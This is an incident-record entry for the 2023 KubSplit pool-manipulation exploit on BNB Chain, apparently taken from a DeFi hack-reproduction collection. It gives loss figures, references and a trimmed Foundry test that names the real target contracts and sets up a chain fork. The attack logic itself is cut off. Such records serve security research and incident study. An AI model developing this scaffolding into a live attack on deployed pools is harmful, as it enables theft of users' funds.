# [?] KubSplit - Pool manipulation

## Summary
Severity: Unknown
Chain: BNB Chain
Component: Kub_Split
Published: 2023-09-24
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-09/Kub_Split_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$78K
References:
- https://twitter.com/CertiKAlert/status/1705966214319612092

```solidity
contract ContractTest is Test {
    Uni_Pair_V2 private constant BUSDT_KUB_LP = Uni_Pair_V2(0x39aDFE6ec5a19bb573a2Fd8A5028031C0dc57600);
    Uni_Pair_V2 private constant KUB_Split = Uni_Pair_V2(0x16bF07CC3b84c6C2F97c32a6C66aEB726AbfC570);
    IERC20 private constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 private constant KUB = IERC20(0x808602d91e58f2d58D7C09306044b88234ab4628);
    ISplit private constant Split = ISplit(0xc98E183D2e975F0567115CB13AF893F0E3c0d0bD);
    IERC20 private constant fakeUSDC = IERC20(0xa88D48a4c6D8dD6a166A71CC159A2c588Fa882BB);
    IDPPOracle private constant DPPOracle1 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IDPPOracle private constant DPPOracle2 = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IDPPOracle private constant DPPOracle3 = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    IDPPOracle private constant DPPAdvanced = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
    IDPPOracle private constant DPP = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    Uni_Router_V2 private constant Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Router_V2 private constant PancakeRouter1 = Uni_Router_V2(0xfDE81E1f340C3ec271142723781df9e685653213);
    Uni_Router_V2 private constant PancakeRouter2 = Uni_Router_V2(0x5D82aeA1fE75CB40AfE792dAe1cf76EA8E2808CE);
    IStakingRewards private constant StakingRewards1 = IStakingRewards(0x26Eea9ff2f3caDec4d6Fc4f462F677b58AB31Ab0);
    IStakingRewards private constant StakingRewards2 = IStakingRewards(0x3A006dD44a4a0e43C942f57d452a6a7Ada25AdC3);
    Uni_Pair_V2 private constant BUSDT_Split = Uni_Pair_V2(0xe4D038DE672e226877Db8FA2670C5ba9778155fF);
    address private constant BUSDT_KUB = 0x1E338D9Db6bb78cFd8eE1F756907899C006711AF;
    address private constant upAddressForStake = 0x67Bf514E9e07b2F95C8805f9a035f60512384d1c;
    address private constant exploiter = 0x7Ccf451D3c48C8bb747f42F29A0CdE4209FF863e;

    function setUp() public {
        vm.createSelectFork("bsc", 32_021_100 - 1);
        vm.label(address(BUSDT_KUB_LP), "BUSDT_KUB_LP");
        vm.label(address(KUB_Split), "KUB_Split");
        vm.label(address(BUSDT), "BUSDT");
        vm.label(address(KUB), "KUB");
        vm.label(address(Split), "Split");
        vm.label(address(fakeUSDC), "fakeUSDC");
        vm.label(address(DPPOracle1), "DPPOracle1");
        vm.label(address(DPPOracle2), "DPPOracle2");
        vm.label(address(DPPOracle3), "DPPOracle3");
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-09/Kub_Split_exp.sol_
